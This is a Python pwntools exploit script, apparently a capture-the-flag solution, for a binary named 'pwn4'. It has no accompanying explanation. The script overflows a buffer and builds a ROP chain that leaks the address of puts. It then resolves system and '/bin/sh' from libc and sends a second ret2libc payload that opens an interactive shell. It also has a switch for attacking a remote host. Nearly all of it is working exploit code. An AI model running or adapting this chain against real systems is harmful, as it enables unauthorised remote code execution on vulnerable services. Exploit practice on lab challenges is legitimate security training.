#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
os_level = 64
binary_name = 'pwn4'
remote_addr, port = ':'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
display = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[func]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))

    return (system, bin_sh)

#Main function
if __name__ == '__main__':
    #you can add your code here
    payload = b'\x00' + b'a'*(0x60-1) + b'b'*0x8
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.sym['main']
    prdi = 0x4007d3
    ret = 0x400556
    payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)
    sla('message:\n',payload)
    rl()
    puts_addr = u64(rl().strip(b'\n').ljust(8,b'\x00'))
    display('puts',puts_addr)
    system, bin_sh = ret2libc(puts_addr, 'puts','./libc-2.31.so')
    payload = b''
    payload = payload.ljust(0x68, b'\x00')
    payload += p64(prdi) + p64(bin_sh) + p64(ret) + p64(system)
    sla('message:\n',payload)
    p.interactive()
